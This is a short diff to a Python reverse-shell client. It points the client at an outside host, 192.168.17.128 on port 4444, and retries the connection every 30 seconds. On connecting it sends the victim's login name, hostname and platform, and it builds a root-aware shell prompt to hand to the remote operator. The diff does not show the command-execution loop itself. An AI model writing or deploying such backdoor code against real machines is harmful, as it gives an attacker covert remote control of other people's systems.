@@ -1,4 +1,4 @@
-host = '127.0.0.1'
+host = '192.168.17.128'
 port = 4444
 
 import os
@@ -16,14 +16,17 @@ def init(text):
             break
         except Exception:
             sleep(30)
-if __name__ == '__main__':
-    systemv = os.getlogin() +'/'+ platform.platform()
-    prompt = os.getcwd()
+def getprompt():
     if 'Linux' in systemv:
-        prompt +='$'
+        if os.getuid() ==0 :
+            return 'root@'+socket.gethostname()+':'+os.getcwd()+'#'
+        else:
+            return os.getlogin()+'@'+socket.gethostname()+':'+os.getcwd()+'$'
     else:
-        prompt +='>'
-    text = prompt +'`'+systemv
+        return os.getcwd()+'>'
+if __name__ == '__main__':
+    systemv = os.getlogin() +'/'+ socket.gethostname()+'/'+platform.platform()
+    text = getprompt() +'`'+systemv
     init(text)
 
     while True:
